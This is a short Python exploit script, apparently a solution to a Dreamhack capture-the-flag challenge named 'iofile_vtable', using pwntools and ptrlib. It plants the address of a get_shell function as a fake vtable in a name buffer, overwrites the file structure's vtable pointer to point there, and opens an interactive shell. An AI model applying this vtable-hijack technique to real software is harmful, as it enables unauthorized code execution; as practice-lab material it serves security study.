#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./iofile_vtable")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 16521)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    name_addr = 0x6010D0
    get_shell = unwrap(exe.symbol("get_shell"))

    io.sendafter("name: ", ptr.p64(get_shell))  # fake vtable

    # input(">> ")
    io.sendlineafter("> ", "4")
    # io.sendafter("change: ", ptr.p64(name_addr))
    io.sendafter("change: ", ptr.p64(name_addr - 0x8 - 0x30))

    # io.sendlineafter("> ", "0")

    # time.sleep(63)
    io.interactive()
    return


if __name__ == "__main__":
    main()
